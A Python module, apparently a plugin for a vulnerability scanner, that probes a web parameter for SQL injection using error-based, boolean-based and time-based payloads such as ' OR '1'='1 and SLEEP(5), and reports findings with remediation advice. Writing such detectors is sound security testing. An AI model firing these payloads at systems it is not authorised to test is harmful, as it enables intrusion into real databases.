import requests
import time

# Common error signatures across DB engines — if any of these show up
# in a response after we inject a payload, it strongly suggests the
# input is being concatenated directly into a SQL query, unsanitized.
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "pg_query()",
    "sqlite3.OperationalError",
    "ORA-01756",
]

ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "' --", "1' AND '1'='2"]


def check_error_based(url, param, cookies=None):
    findings = []
    for payload in ERROR_PAYLOADS:
        test_params = {param: payload, "Submit": "Submit"}
        try:
            resp = requests.get(url, params=test_params, cookies=cookies, timeout=10)
        except requests.RequestException as e:
            continue  # target unreachable for this payload, skip and move on

        body = resp.text.lower()
        for sig in SQL_ERRORS:
            if sig.lower() in body:
                findings.append({
                    "type": "SQL Injection (Error-Based)",
                    "parameter": param,
                    "payload": payload,
                    "severity": "High",
                    "evidence": f"Database error signature '{sig}' found in response",
                    "remediation": "Use parameterized queries / prepared statements instead of concatenating user input into SQL queries."
                })
                break  # one match per payload is enough, don't spam duplicate findings
    return findings

def check_boolean_based(url, param, cookies=None):
    findings = []
    true_payload = "1' OR '1'='1"
    false_payload = "1' AND '1'='2"

    try:
        resp_true = requests.get(url, params={param: true_payload, "Submit": "Submit"}, cookies=cookies, timeout=10)
        resp_false = requests.get(url, params={param: false_payload, "Submit": "Submit"}, cookies=cookies, timeout=10)
    except requests.RequestException:
        return findings

    if len(resp_true.text) - len(resp_false.text) > 50:
        findings.append({
            "type": "SQL Injection (Boolean-Based)",
            "parameter": param,
            "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
            "severity": "High",
            "evidence": f"Response length differs significantly (TRUE={len(resp_true.text)} chars, FALSE={len(resp_false.text)} chars)",
            "remediation": "Use parameterized queries and validate/escape all user input before use in SQL statements."
        })
    return findings

def check_time_based(url, param, cookies=None, delay=5):
    findings = []
    payload = f"1' AND SLEEP({delay}) -- -"

    try:
        start = time.time()
        resp = requests.get(url, params={param: payload, "Submit": "Submit"}, cookies=cookies, timeout=delay + 10)
        elapsed = time.time() - start
    except requests.RequestException:
        return findings

    # If the response took noticeably longer than the injected delay, databse executed SLEEP()
    if elapsed >= delay:
        findings.append({
            "type": "SQL Injection (Time-Based)",
            "parameter": param,
            "payload": payload,
            "severity": "High",
            "evidence": f"Response took {elapsed:.2f}s (expected delay: {delay}s), indicating the SLEEP() command executed on the database",
            "remediation": "Use parameterized queries / prepared statements; do not concatenate user input into SQL statements."
        })
    return findings

def run(target_url, param="id", cookies=None):
    """
    Entry point the main framework will call.
    target_url: full URL to the vulnerable endpoint
    param: the parameter name to test
    cookies: authenticated session cookies, if required
    Returns a combined list of findings from all SQLi detection techniques.
    """
    results = []
    results += check_error_based(target_url, param, cookies)
    results += check_boolean_based(target_url, param, cookies)
    results += check_time_based(target_url, param, cookies)
    return results
